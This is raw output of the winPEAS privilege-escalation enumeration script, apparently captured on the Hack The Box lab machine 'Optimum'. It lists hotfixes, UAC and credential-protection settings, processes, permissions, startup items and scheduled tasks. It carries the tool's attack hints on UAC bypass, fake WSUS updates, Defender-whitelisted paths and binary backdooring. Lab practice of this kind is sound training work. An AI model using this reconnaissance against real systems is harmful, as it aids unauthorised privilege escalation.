System Locale:             el;Greek                                                                                                                                                                                                         
Input Locale:              en-us;English (United States)                                                                                                                                                                                    
Time Zone:                 (UTC+02:00) Athens, Bucharest                                                                                                                                                                                    
Total Physical Memory:     4.095 MB                                                                                                                                                                                                         
Available Physical Memory: 3.321 MB                                                                                                                                                                                                         
Virtual Memory: Max Size:  5.503 MB                                                                                                                                                                                                         
Virtual Memory: Available: 4.527 MB                                                                                                                                                                                                         
Virtual Memory: In Use:    976 MB                                                                                                                                                                                                           
Page File Location(s):     C:\pagefile.sys                                                                                                                                                                                                  
Domain:                    HTB                                                                                                                                                                                                              
Logon Server:              \\OPTIMUM                                                                                                                                                                                                        
Hotfix(s):                 31 Hotfix(s) Installed.                                                                                                                                                                                          
                           [01]: KB2959936                                                                                                                                                                                                  
                           [02]: KB2896496                                                                                                                                                                                                  
                           [03]: KB2919355                                                                                                                                                                                                  
                           [04]: KB2920189                                                                                                                                                                                                  
                           [05]: KB2928120                                                                                                                                                                                                  
                           [06]: KB2931358                                                                                                                                                                                                  
                           [07]: KB2931366                                                                                                                                                                                                  
                           [08]: KB2933826                                                                                                                                                                                                  
                           [09]: KB2938772                                                                                                                                                                                                  
                           [10]: KB2949621                                                                                                                                                                                                  
                           [11]: KB2954879                                                                                                                                                                                                  
                           [12]: KB2958262                                                                                                                                                                                                  
                           [13]: KB2958263                                                                                                                                                                                                  
                           [14]: KB2961072                                                                                                                                                                                                  
                           [15]: KB2965500                                                                                                                                                                                                  
                           [16]: KB2966407                                                                                                                                                                                                  
                           [17]: KB2967917                                                                                                                                                                                                  
                           [18]: KB2971203                                                                                                                                                                                                  
                           [19]: KB2971850                                                                                                                                                                                                  
                           [20]: KB2973351                                                                                                                                                                                                  
                           [21]: KB2973448                                                                                                                                                                                                  
                           [22]: KB2975061                                                                                                                                                                                                  
                           [23]: KB2976627                                                                                                                                                                                                  
                           [24]: KB2977629                                                                                                                                                                                                  
                           [25]: KB2981580                                                                                                                                                                                                  
                           [26]: KB2987107                                                                                                                                                                                                  
                           [27]: KB2989647                                                                                                                                                                                                  
                           [28]: KB2998527                                                                                                                                                                                                  
                           [29]: KB3000850                                                                                                                                                                                                  
                           [30]: KB3003057                                                                                                                                                                                                  
                           [31]: KB3014442                                                                                                                                                                                                  
Network Card(s):           1 NIC(s) Installed.                                                                                                                                                                                              
                           [01]: Intel(R) 82574L Gigabit Network Connection                                                                                                                                                                 
                                 Connection Name: Ethernet0                                                                                                                                                                                 
                                 DHCP Enabled:    Yes                                                                                                                                                                                       
                                 DHCP Server:     10.129.0.1                                                                                                                                                                                
                                 IP address(es)                                                                                                                                                                                             
                                 [01]: 10.129.38.48                                                                                                                                                                                         
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.                                                                                                                             
                                                                                                                                                                                                                                            
Caption                                     Description      HotFixID   InstalledOn                                                                                                                                                         
                                                                                                                                                                                                                                            
                                            Update           KB2959936  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2896496  Update           KB2896496  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2919355  Update           KB2919355  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2920189  Security Update  KB2920189  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2928120  Security Update  KB2928120  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2931358  Security Update  KB2931358  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2931366  Security Update  KB2931366  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2933826  Security Update  KB2933826  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2938772  Update           KB2938772  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2949621  Hotfix           KB2949621  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2954879  Update           KB2954879  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2958262  Update           KB2958262  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2958263  Update           KB2958263  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2961072  Security Update  KB2961072  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2965500  Update           KB2965500  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2966407  Update           KB2966407  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2967917  Update           KB2967917  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2971203  Update           KB2971203  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2971850  Security Update  KB2971850  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2973351  Security Update  KB2973351  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2973448  Update           KB2973448  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2975061  Update           KB2975061  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2976627  Security Update  KB2976627  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2977629  Security Update  KB2977629  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2981580  Update           KB2981580  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2987107  Security Update  KB2987107  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2989647  Update           KB2989647  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=2998527  Update           KB2998527  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=3000850  Update           KB3000850  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=3003057  Security Update  KB3003057  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
http://support.microsoft.com/?kbid=3014442  Update           KB3014442  11/22/2014                                                                                                                                                          
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] DATE and TIME                                                                                                                                                                                                                          
   [i] You may need to adjust your local date/time to exploit some vulnerability                                                                                                                                                            
��� 04/05/2025                                                                                                                                                                                                                              
09:43 ��                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
 [+] Audit Settings                                                                                                                                                                                                                         
   [i] Check what is being logged                                                                                                                                                                                                           
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] WEF Settings                                                                                                                                                                                                                           
   [i] Check where are being sent the logs                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
 [+] Legacy Microsoft LAPS installed?                                                                                                                                                                                                       
   [i] Check what is being logged                                                                                                                                                                                                           
                                                                                                                                                                                                                                            
 [+] Windows LAPS installed?                                                                                                                                                                                                                
   [i] Check what is being logged: 0x00 Disabled, 0x01 Backup to Entra, 0x02 Backup to Active Directory                                                                                                                                     
                                                                                                                                                                                                                                            
 [+] LSA protection?                                                                                                                                                                                                                        
   [i] Active if "1"                                                                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] Credential Guard?                                                                                                                                                                                                                      
   [i] Active if "1" or "2"                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] WDigest?                                                                                                                                                                                                                               
   [i] Plain-text creds in memory if "1"                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
 [+] Number of cached creds                                                                                                                                                                                                                 
   [i] You need System-rights to extract them                                                                                                                                                                                               
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] UAC Settings                                                                                                                                                                                                                           
   [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on                                                                                                                                                
   [?] https://book.hacktricks.wiki/en/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html#very-basic-uac-bypass-full-file-system-access                                                                 
                                                                                                                                                                                                                                            
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System                                                                                                                                                                
    EnableLUA    REG_DWORD    0x1                                                                                                                                                                                                           
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] Registered Anti-Virus(AV)                                                                                                                                                                                                              
C:\Users\kostas\Desktop\winPEAS.bat : ERROR:                                                                                                                                                                                                
At line:1 char:1                                                                                                                                                                                                                            
+ C:\Users\kostas\Desktop\winPEAS.bat > C:\Users\kostas\Desktop\peas.txt 2>&1                                                                                                                                                               
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                                                                                               
    + CategoryInfo          : NotSpecified: (ERROR::String) [], RemoteException                                                                                                                                                             
    + FullyQualifiedErrorId : NativeCommandError                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Description = Invalid namespace                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Checking for defender whitelisted PATHS                                                                                                                                                                                                     
 [+] PowerShell settings                                                                                                                                                                                                                    
PowerShell v2 Version:                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine                                                                                                                                                                         
    PowerShellVersion    REG_SZ    2.0                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
PowerShell v5 Version:                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine                                                                                                                                                                         
    PowerShellVersion    REG_SZ    4.0                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
Transcriptions Settings:                                                                                                                                                                                                                    
Module logging settings:                                                                                                                                                                                                                    
Scriptblog logging settings:                                                                                                                                                                                                                
                                                                                                                                                                                                                                            
PS default transcript history                                                                                                                                                                                                               
                                                                                                                                                                                                                                            
Checking PS history file                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
 [+] MOUNTED DISKS                                                                                                                                                                                                                          
   [i] Maybe you find something interesting                                                                                                                                                                                                 
Caption                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
C:                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] ENVIRONMENT                                                                                                                                                                                                                            
   [i] Interesting information?                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
ALLUSERSPROFILE=C:\ProgramData                                                                                                                                                                                                              
APPDATA=C:\Users\kostas\AppData\Roaming                                                                                                                                                                                                     
CommonProgramFiles=C:\Program Files (x86)\Common Files                                                                                                                                                                                      
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files                                                                                                                                                                                 
CommonProgramW6432=C:\Program Files\Common Files                                                                                                                                                                                            
COMPUTERNAME=OPTIMUM                                                                                                                                                                                                                        
ComSpec=C:\Windows\system32\cmd.exe                                                                                                                                                                                                         
CurrentFolder=C:\Users\kostas\Desktop\                                                                                                                                                                                                      
CurrentLine= 0x1B[33m[+]0x1B[97m ENVIRONMENT                                                                                                                                                                                                
E=0x1B[                                                                                                                                                                                                                                     
expl=no                                                                                                                                                                                                                                     
FP_NO_HOST_CHECK=NO                                                                                                                                                                                                                         
HOMEDRIVE=C:                                                                                                                                                                                                                                
HOMEPATH=\Users\kostas                                                                                                                                                                                                                      
LOCALAPPDATA=C:\Users\kostas\AppData\Local                                                                                                                                                                                                  
LOGONSERVER=\\OPTIMUM                                                                                                                                                                                                                       
long=false                                                                                                                                                                                                                                  
NUMBER_OF_PROCESSORS=2                                                                                                                                                                                                                      
OS=Windows_NT                                                                                                                                                                                                                               
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\                                                                                                                                    
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL                                                                                                                                                                          
Percentage=1                                                                                                                                                                                                                                
PercentageTrack=20                                                                                                                                                                                                                          
PROCESSOR_ARCHITECTURE=x86                                                                                                                                                                                                                  
PROCESSOR_ARCHITEW6432=AMD64                                                                                                                                                                                                                
PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD                                                                                                                                                                       
PROCESSOR_LEVEL=25                                                                                                                                                                                                                          
PROCESSOR_REVISION=0101                                                                                                                                                                                                                     
ProgramData=C:\ProgramData                                                                                                                                                                                                                  
ProgramFiles=C:\Program Files (x86)                                                                                                                                                                                                         
ProgramFiles(x86)=C:\Program Files (x86)                                                                                                                                                                                                    
ProgramW6432=C:\Program Files                                                                                                                                                                                                               
PROMPT=$P$G                                                                                                                                                                                                                                 
PSExecutionPolicyPreference=Bypass                                                                                                                                                                                                          
PSModulePath=C:\Users\kostas\Documents\WindowsPowerShell\Modules;C:\Program Files (x86)\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules\                                                                       
PUBLIC=C:\Users\Public                                                                                                                                                                                                                      
SESSIONNAME=Console                                                                                                                                                                                                                         
SystemDrive=C:                                                                                                                                                                                                                              
SystemRoot=C:\Windows                                                                                                                                                                                                                       
TEMP=C:\Users\kostas\AppData\Local\Temp                                                                                                                                                                                                     
TMP=C:\Users\kostas\AppData\Local\Temp                                                                                                                                                                                                      
USERDOMAIN=OPTIMUM                                                                                                                                                                                                                          
USERDOMAIN_ROAMINGPROFILE=OPTIMUM                                                                                                                                                                                                           
USERNAME=kostas                                                                                                                                                                                                                             
USERPROFILE=C:\Users\kostas                                                                                                                                                                                                                 
windir=C:\Windows                                                                                                                                                                                                                           
                                                                                                                                                                                                                                            
 [+] INSTALLED SOFTWARE                                                                                                                                                                                                                     
   [i] Some weird software? Check for vulnerabilities in unknow software installed                                                                                                                                                          
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications                                                                                                                         
                                                                                                                                                                                                                                            
Common Files                                                                                                                                                                                                                                
Common Files                                                                                                                                                                                                                                
Embedded Lockdown Manager                                                                                                                                                                                                                   
Internet Explorer                                                                                                                                                                                                                           
Internet Explorer                                                                                                                                                                                                                           
Microsoft.NET                                                                                                                                                                                                                               
VMware                                                                                                                                                                                                                                      
Windows Mail                                                                                                                                                                                                                                
Windows Mail                                                                                                                                                                                                                                
Windows NT                                                                                                                                                                                                                                  
Windows NT                                                                                                                                                                                                                                  
WindowsPowerShell                                                                                                                                                                                                                           
WindowsPowerShell                                                                                                                                                                                                                           
                                                                                                                                                                                                                                            
 [+] Remote Desktop Credentials Manager                                                                                                                                                                                                     
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#remote-desktop-credential-manager                                                                                                    
                                                                                                                                                                                                                                            
 [+] WSUS                                                                                                                                                                                                                                   
   [i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)                                                                                                                                                                  
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus                                                                                                                                 
                                                                                                                                                                                                                                            
 [+] RUNNING PROCESSES                                                                                                                                                                                                                      
   [i] Something unexpected is running? Check for vulnerabilities                                                                                                                                                                           
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes                                                                                                                    
                                                                                                                                                                                                                                            
Image Name                     PID Services                                                                                                                                                                                                 
========================= ======== ============================================                                                                                                                                                             
System Idle Process              0 N/A                                                                                                                                                                                                      
System                           4 N/A                                                                                                                                                                                                      
smss.exe                       228 N/A                                                                                                                                                                                                      
csrss.exe                      332 N/A                                                                                                                                                                                                      
csrss.exe                      388 N/A                                                                                                                                                                                                      
wininit.exe                    396 N/A                                                                                                                                                                                                      
winlogon.exe                   424 N/A                                                                                                                                                                                                      
services.exe                   480 N/A                                                                                                                                                                                                      
lsass.exe                      488 SamSs                                                                                                                                                                                                    
svchost.exe                    548 BrokerInfrastructure, DcomLaunch, LSM,                                                                                                                                                                   
                                   PlugPlay, Power, SystemEventsBroker                                                                                                                                                                      
svchost.exe                    576 RpcEptMapper, RpcSs                                                                                                                                                                                      
dwm.exe                        660 N/A                                                                                                                                                                                                      
svchost.exe                    672 Dhcp, EventLog, lmhosts, Wcmsvc                                                                                                                                                                          
svchost.exe                    700 DsmSvc, gpsvc, iphlpsvc, LanmanServer,                                                                                                                                                                   
                                   ProfSvc, Schedule, SENS, ShellHWDetection,                                                                                                                                                               
                                   Themes, Winmgmt                                                                                                                                                                                          
svchost.exe                    736 EventSystem, FontCache, netprofm, nsi,                                                                                                                                                                   
                                   W32Time                                                                                                                                                                                                  
svchost.exe                    832 CryptSvc, Dnscache, LanmanWorkstation,                                                                                                                                                                   
                                   NlaSvc, WinRM                                                                                                                                                                                            
svchost.exe                    976 BFE, DPS, MpsSvc                                                                                                                                                                                         
spoolsv.exe                    288 Spooler                                                                                                                                                                                                  
svchost.exe                    624 TrkWks, UALSVC                                                                                                                                                                                           
VGAuthService.exe              804 VGAuthService                                                                                                                                                                                            
vmtoolsd.exe                   848 VMTools                                                                                                                                                                                                  
ManagementAgentHost.exe        264 VMwareCAFManagementAgentHost                                                                                                                                                                             
svchost.exe                   1244 PolicyAgent                                                                                                                                                                                              
dllhost.exe                   1460 COMSysApp                                                                                                                                                                                                
msdtc.exe                     1616 MSDTC                                                                                                                                                                                                    
WmiPrvSE.exe                  1668 N/A                                                                                                                                                                                                      
taskhostex.exe                1596 N/A                                                                                                                                                                                                      
explorer.exe                  1968 N/A                                                                                                                                                                                                      
vmtoolsd.exe                  2372 N/A                                                                                                                                                                                                      
hfs.exe                       2400 N/A                                                                                                                                                                                                      
powershell.exe                1916 N/A                                                                                                                                                                                                      
conhost.exe                   2436 N/A                                                                                                                                                                                                      
powershell.exe                 776 N/A                                                                                                                                                                                                      
powershell.exe                  84 N/A                                                                                                                                                                                                      
conhost.exe                   2692 N/A                                                                                                                                                                                                      
conhost.exe                   2536 N/A                                                                                                                                                                                                      
powershell.exe                2892 N/A                                                                                                                                                                                                      
conhost.exe                   2888 N/A                                                                                                                                                                                                      
cmd.exe                       1200 N/A                                                                                                                                                                                                      
WmiPrvSE.exe                   148 N/A                                                                                                                                                                                                      
TrustedInstaller.exe          1628 TrustedInstaller                                                                                                                                                                                         
TiWorker.exe                  2960 N/A                                                                                                                                                                                                      
tasklist.exe                  2216 N/A                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
   [i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)                                                                                              
C:\Windows\Explorer.EXE NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                     
                                                                                                                                                                                                                                            
C:\Program Files\VMware\VMware Tools\vmtoolsd.exe BUILTIN\Administrators:(F)                                                                                                                                                                
                                                                                                                                                                                                                                            
C:\Users\kostas\Desktop\hfs.exe NT AUTHORITY\SYSTEM:(F)                                                                                                                                                                                     
                                OPTIMUM\kostas:(F)                                                                                                                                                                                          
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                   
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                   
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                   
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                   
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\cmd.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                 
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\cmd.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                 
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\Wbem\WMIC.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                           
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\find.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\find.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\find.exe NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
   [i] Checking directory permissions of running processes (DLL injection)                                                                                                                                                                  
C:\Windows\ NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
C:\Program Files\VMware\VMware Tools\ BUILTIN\Administrators:(OI)(CI)(F)                                                                                                                                                                    
                                                                                                                                                                                                                                            
C:\Users\kostas\Desktop\ NT AUTHORITY\SYSTEM:(OI)(CI)(F)                                                                                                                                                                                    
                         OPTIMUM\kostas:(OI)(CI)(F)                                                                                                                                                                                         
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\ NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                 
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\ NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                 
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\ NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                 
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\ NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                 
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                        
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                        
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\wbem\ NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                   
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                        
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                        
                                                                                                                                                                                                                                            
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 [+] RUN AT STARTUP                                                                                                                                                                                                                         
   [i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary                                                                                                                
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#run-at-startup                                                                                                                       
C:\Documents and Settings\All Users\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)                                                                                                                                      
                                                                                                                                                                                                                                            
C:\Documents and Settings\kostas\Start Menu\Programs\Startup NT AUTHORITY\SYSTEM:(OI)(CI)(F)                                                                                                                                                
                                                             OPTIMUM\kostas:(OI)(CI)(F)                                                                                                                                                     
                                                                                                                                                                                                                                            
C:\Documents and Settings\kostas\Start Menu\Programs\Startup\desktop.ini NT AUTHORITY\SYSTEM:(F)                                                                                                                                            
                                                                         OPTIMUM\kostas:(F)                                                                                                                                                 
C:\Documents and Settings\kostas\Start Menu\Programs\Startup\hfs - Shortcut.lnk NT AUTHORITY\SYSTEM:(F)                                                                                                                                     
                                                                                OPTIMUM\kostas:(F)                                                                                                                                          
                                                                                                                                                                                                                                            
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)                                                                                                                                         
                                                                                                                                                                                                                                            
C:\Users\kostas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup NT AUTHORITY\SYSTEM:(OI)(CI)(F)                                                                                                                               
                                                                              OPTIMUM\kostas:(OI)(CI)(F)                                                                                                                                    
                                                                                                                                                                                                                                            
C:\Users\kostas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini NT AUTHORITY\SYSTEM:(F)                                                                                                                           
                                                                                          OPTIMUM\kostas:(F)                                                                                                                                
C:\Users\kostas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs - Shortcut.lnk NT AUTHORITY\SYSTEM:(F)                                                                                                                    
                                                                                                 OPTIMUM\kostas:(F)                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Folder: \                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                            
Folder: \Microsoft                                                                                                                                                                                                                          
INFO: There are no scheduled tasks presently available at your access level.                                                                                                                                                                
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows                                                                                                                                                                                                                  
INFO: There are no scheduled tasks presently available at your access level.                                                                                                                                                                
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\.NET Framework                                                                                                                                                                                                   
.NET Framework NGEN v4.0.30319           N/A                    Ready                                                                                                                                                                       
.NET Framework NGEN v4.0.30319 64        N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Active Directory Rights Management Services Client                                                                                                                                                               
AD RMS Rights Policy Template Management N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\AppID                                                                                                                                                                                                            
SmartScreenSpecific                      N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Application Experience                                                                                                                                                                                           
Microsoft Compatibility Appraiser        5/5/2025 12:36:36 ��   Ready                                                                                                                                                                       
ProgramDataUpdater                       N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Autochk                                                                                                                                                                                                          
Proxy                                    N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\CertificateServicesClient                                                                                                                                                                                        
UserTask                                 N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Chkdsk                                                                                                                                                                                                           
ProactiveScan                            N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Customer Experience Improvement Program                                                                                                                                                                          
Consolidator                             4/5/2025 11:00:00 ��   Ready                                                                                                                                                                       
KernelCeipTask                           N/A                    Ready                                                                                                                                                                       
UsbCeip                                  N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Customer Experience Improvement Program\Server                                                                                                                                                                   
ServerCeipAssistant                      5/5/2025 6:54:30 ��    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Data Integrity Scan                                                                                                                                                                                              
Data Integrity Scan                      1/6/2025 11:04:34 ��   Ready                                                                                                                                                                       
Data Integrity Scan for Crash Recovery   N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Defrag                                                                                                                                                                                                           
ScheduledDefrag                          N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Device Setup                                                                                                                                                                                                     
Metadata Refresh                         N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\IME                                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\MemoryDiagnostic                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\MUI                                                                                                                                                                                                              
LPRemove                                 N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Multimedia                                                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\NetCfg                                                                                                                                                                                                           
BindingWorkItemQueueHandler              N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\NetTrace                                                                                                                                                                                                         
GatherNetworkInfo                        N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\PLA                                                                                                                                                                                                              
INFO: There are no scheduled tasks presently available at your access level.                                                                                                                                                                
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Plug and Play                                                                                                                                                                                                    
Device Install Reboot Required           N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Power Efficiency Diagnostics                                                                                                                                                                                     
AnalyzeSystem                            N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\RAC                                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Folder: \Microsoft\Windows\Registry                                                                                                                                                                                                         
RegIdleBackup                            N/A                    Ready                                                                                                                                                                       
                                                                                                                                                                                                                                            
